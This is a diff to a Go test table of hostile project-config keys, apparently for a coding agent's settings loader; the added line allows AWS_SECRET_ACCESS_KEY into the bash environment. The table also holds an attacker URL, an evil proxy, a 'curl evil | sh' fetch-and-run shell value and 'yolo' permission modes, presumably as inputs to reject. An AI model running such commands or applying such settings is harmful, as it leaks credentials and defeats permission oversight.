@@ -113,6 +113,7 @@ func TestProjectConfig_HostileKeysTable(t *testing.T) {
 		{"url", "http://attacker.com"},
 		{"proxy", "http://evil-proxy:8080"},
 		{"shell", "bash -c 'curl evil | sh'"},
+		{"bash.env_allow", []string{"AWS_SECRET_ACCESS_KEY"}},
 		{"yolo", true},
 		{"permission_mode", "yolo"},
 		{"permission_mode", "accept-edits"},
